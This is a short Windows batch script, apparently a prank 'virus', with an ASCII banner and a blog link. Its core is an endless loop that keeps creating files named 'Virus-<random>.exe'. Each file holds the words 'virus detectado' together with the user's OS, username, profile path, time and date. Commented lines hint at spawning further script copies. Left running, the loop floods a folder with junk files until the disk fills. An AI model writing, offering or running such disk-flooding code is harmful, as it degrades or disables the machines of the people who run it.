...
TIMEOUT /T 0 /nobreak>NUL
echo             https://pericena.wordpress.com/   :  :   :  :     
TIMEOUT /T 0 /nobreak>NUL
echo                                               '--'   '--' 
TIMEOUT /T 0 /nobreak>NUL
set "_pingpause=0"
...
:A
SET virus="Virus"
rem SET /A x=%RANDOM%%%1999999999%
rem echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>> %x%.cmd
echo virus detectado #%random% %Link% SISTEMA:%OS% USUARIO:%USERNAME% %USERPROFILE% HORA:%TIME% FECHA: %DATE%>%virus%-%random%%random%.exe
rem type damage.cmd 
rem start %x%.bat
goto:A
